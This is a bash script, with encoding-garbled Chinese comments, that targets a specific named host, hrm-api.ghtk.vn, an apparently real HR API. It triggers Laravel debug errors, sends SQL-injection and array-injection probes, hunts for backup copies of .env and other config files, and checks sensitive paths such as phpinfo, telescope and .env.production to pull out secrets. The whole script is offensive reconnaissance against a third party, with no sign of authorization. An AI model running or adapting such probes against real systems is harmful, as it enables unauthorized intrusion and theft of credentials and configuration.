#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ åŸºäº.htaccesså‘ç°çš„æ·±åº¦åˆ©ç”¨"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="hrm-api.ghtk.vn"

echo "[*] ç­–ç•¥1ï¼šåˆ©ç”¨Laravel Debugæ¨¡å¼"
echo "å¦‚æœDebugå¼€å¯ï¼Œè§¦å‘é”™è¯¯å¯èƒ½æ³„éœ²å®Œæ•´è·¯å¾„å’Œé…ç½®"
echo ""

# è§¦å‘å„ç§é”™è¯¯
echo "[1] æµ‹è¯•ä¸å­˜åœ¨çš„æ–¹æ³•..."
curl -sk "https://$TARGET/api/nonexist_method_xyz" -X POST \
    -H "Content-Type: application/json" \
    -d '{"test":1}' 2>&1 | head -50

echo ""
echo "[2] æµ‹è¯•SQLæ³¨å…¥è§¦å‘é”™è¯¯..."
curl -sk "https://$TARGET/api/user/1'" 2>&1 | head -50

echo ""
echo "[3] æµ‹è¯•æ•°ç»„æ³¨å…¥..."
curl -sk "https://$TARGET/api/test?arr[]=1&arr[]=2&arr[0][0]=3" 2>&1 | head -50

echo ""
echo "[*] ç­–ç•¥2ï¼šæŸ¥æ‰¾å¤‡ä»½æ–‡ä»¶"
BACKUP_EXT=("~" ".bak" ".backup" ".old" ".orig" ".save" ".swp" ".swo")

for ext in "${BACKUP_EXT[@]}"; do
    for file in ".env" ".htaccess" "composer.json"; do
        test_file="${file}${ext}"
        echo -n "  /$test_file â†’ "
        resp=$(curl -sk "https://$TARGET/$test_file" -w "%{http_code}" -o /tmp/backup -m 2 2>/dev/null)
        if [ "$resp" == "200" ] && [ -s /tmp/backup ]; then
            if ! grep -q "\"success\":false" /tmp/backup 2>/dev/null; then
                echo "âœ… æ‰¾åˆ°å¤‡ä»½ï¼"
                cat /tmp/backup | head -30
                echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
            else
                echo "âŒ"
            fi
        else
            echo "âŒ"
        fi
    done
done

echo ""
echo "[*] ç­–ç•¥3ï¼šæµ‹è¯•æ‰€æœ‰å¯èƒ½çš„æ•æ„Ÿè·¯å¾„"
PATHS=(
    "/phpinfo.php"
    "/info.php"
    "/test.php"
    "/debug.php"
    "/_profiler"
    "/telescope"
    "/horizon"
    "/.env.local"
    "/.env.production"
    "/storage/framework/down"
)

for path in "${PATHS[@]}"; do
    echo -n "  $path â†’ "
    resp=$(curl -sk "https://$TARGET$path" -w "%{http_code}" -o /tmp/path_test -m 2 2>/dev/null)
    if [ "$resp" == "200" ] && [ -s /tmp/path_test ]; then
        echo "âœ… $resp"
        head -20 /tmp/path_test
        echo "â”â”â”"
    else
        echo "âŒ $resp"
    fi
done

